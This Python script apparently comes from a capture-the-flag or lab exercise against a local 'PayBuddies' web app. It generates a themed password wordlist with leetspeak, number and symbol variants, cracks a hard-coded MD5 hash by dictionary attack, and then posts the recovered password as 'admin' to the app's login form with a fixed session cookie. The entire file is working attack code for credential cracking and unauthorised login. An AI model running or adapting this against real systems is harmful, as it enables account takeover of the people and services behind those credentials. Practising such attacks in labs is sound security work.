import requests
import hashlib
import itertools

target_hash = "7d39307ae824e70052c0aa16816a9b16"

# More comprehensive wordlist based on "PayBuddies" theme
print("[*] Generating comprehensive PayBuddies-themed wordlist...")

base_words = [
    'paybuddies', 'paybuddy', 'buddy', 'buddies', 
    'pay', 'payment', 'payroll', 'paypal',
    'money', 'cash', 'dollar', 'finance',
    'friend', 'friends', 'pal', 'pals',
    'transfer', 'send', 'receive'
]

# Common leetspeak substitutions
def leetspeak(word):
    variants = [word]
    replacements = {
        'a': ['@', '4'],
        'e': ['3'],
        'i': ['1', '!'],
        'o': ['0'],
        's': ['$', '5'],
        'l': ['1'],
        't': ['7'],
        'b': ['8']
    }
    
    # Create simple variants
    for char, subs in replacements.items():
        for sub in subs:
            variants.append(word.replace(char, sub))
            variants.append(word.replace(char.upper(), sub))
    
    return variants

# Generate password candidates
passwords = set()

# Add base words with case variations
for word in base_words:
    passwords.add(word)
    passwords.add(word.lower())
    passwords.add(word.upper())
    passwords.add(word.capitalize())
    
    # Add leetspeak variants
    for variant in leetspeak(word):
        passwords.add(variant)
    
    # Add with numbers
    for num in ['1', '12', '123', '1234', '2024', '2023', '2025', '21', '22', '23', '24']:
        passwords.add(word + num)
        passwords.add(num + word)
        passwords.add(word.capitalize() + num)
    
    # Add with special chars
    for char in ['!', '@', '#', '$', '*', '!!', '123!', '!@#']:
        passwords.add(word + char)
        passwords.add(word.capitalize() + char)

# Add common patterns
common = [
    'password', 'Password', 'PASSWORD', 'password123',
    'admin', 'Admin', 'ADMIN', 'admin123',
    'qwerty', 'qwerty123', '123456', '12345678',
    'welcome', 'Welcome', 'welcome123',
    'letmein', 'monkey', 'dragon', 'master',
    'trustno1', '111111', '1234567890', 'abc123'
]

for pwd in common:
    passwords.add(pwd)

passwords_list = list(passwords)
print(f"[*] Generated {len(passwords_list)} password candidates")
print(f"[*] Sample passwords: {passwords_list[:15]}")
print()

# Test passwords
print(f"[*] Testing passwords against hash {target_hash}...")

for i, pwd in enumerate(passwords_list):
    hash_val = hashlib.md5(pwd.encode()).hexdigest()
    
    if hash_val == target_hash:
        print(f"\n[!] PASSWORD FOUND: {pwd}")
        print(f"[!] Hash: {hash_val}")
        print(f"[!] Found at position {i+1}/{len(passwords_list)}")
        
        # Try to login
        url = "http://127.0.0.1:32892/index.php"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "http://127.0.0.1:32892",
            "Referer": "http://127.0.0.1:32892/"
        }
        cookies = {"PHPSESSID": "9b8ouneh58t3bjv346lp4s82ol"}
        
        print(f"\n[*] Attempting login with username=admin, password={pwd}")
        data = {
            "username": "admin",
            "password": pwd,
            "submit": "submit"
        }
        
        response = requests.post(url, headers=headers, cookies=cookies, data=data, timeout=5)
        print(f"[*] Status: {response.status_code}")
        print(f"[*] Response: {response.text}")
        
        if response.cookies:
            print(f"[*] Cookies: {response.cookies.get_dict()}")
        
        break
    
    # Progress indicator
    if (i + 1) % 500 == 0:
        print(f"[*] Tested {i+1}/{len(passwords_list)} passwords...")

else:
    print(f"\n[-] No match found in {len(passwords_list)} attempts")
    print("[*] This hash may require a dictionary attack with rockyou.txt or similar")

print("\n[*] Script complete")

